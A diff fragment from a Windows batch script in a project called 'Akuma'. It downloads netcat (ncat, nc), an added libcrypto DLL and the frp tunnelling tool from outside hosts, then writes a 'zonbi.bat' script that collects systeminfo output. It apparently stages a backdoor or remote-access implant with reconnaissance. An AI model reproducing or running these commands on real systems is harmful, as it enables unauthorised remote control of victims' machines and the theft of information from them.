@@ -9,6 +9,7 @@ mkdir %homedrive%\Akuma\ncat-portable-5.59BETA1
 mkdir %homedrive%\Akuma\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc
+curl -L https://github.com/l-urk/Akuma/raw/main/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip > frp_0.52.1_windows_amd64.zip
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
